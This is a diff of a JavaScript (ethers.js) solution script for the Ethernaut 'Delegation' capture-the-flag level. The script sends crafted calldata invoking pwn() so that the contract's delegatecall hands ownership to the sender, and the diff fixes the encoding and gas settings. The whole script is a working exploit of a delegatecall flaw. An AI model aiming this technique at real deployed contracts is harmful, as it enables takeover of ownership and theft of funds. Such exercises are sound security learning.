@@ -5,7 +5,7 @@ async function main() {
     const [account] = await ethers.getSigners();
 
     const Delegation = await ethers.getContractFactory("Delegation");
-    const delegation = Delegation.attach("0x8258478DBbd5f38Ad69609BC60701ae664826197");
+    const delegation = Delegation.attach("0x1Ec931f41a49546b06da7bFF9b8E4ba1d48160ec");
 
 
     const iface = new ethers.utils.Interface([
@@ -13,15 +13,16 @@ async function main() {
         "function pwn() public"
     ]);
 
-    let data = iface.encodeFunctionData("pwn", []);
-    data += "00000000000000000000000000000000000000000000000000000000"
+    let data = iface.encodeFunctionData("pwn()", []);
+    data += "0000000000000000000000000000000000000000000000000000000000000000";
 
     let tx = await account.sendTransaction({
+        from: account.address,
         to: delegation.address,
-        data: data
+        data: data,
+        gasLimit: 1000000
     });
     await tx.wait();
-
 
     console.log(account.address);
     console.log(await delegation.owner());
@@ -34,6 +35,4 @@ main()
         process.exit(1);
     });
 
-    // This should work, truly no idea why it doesn't
-    // Should be the same as what's happening here: https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4
 
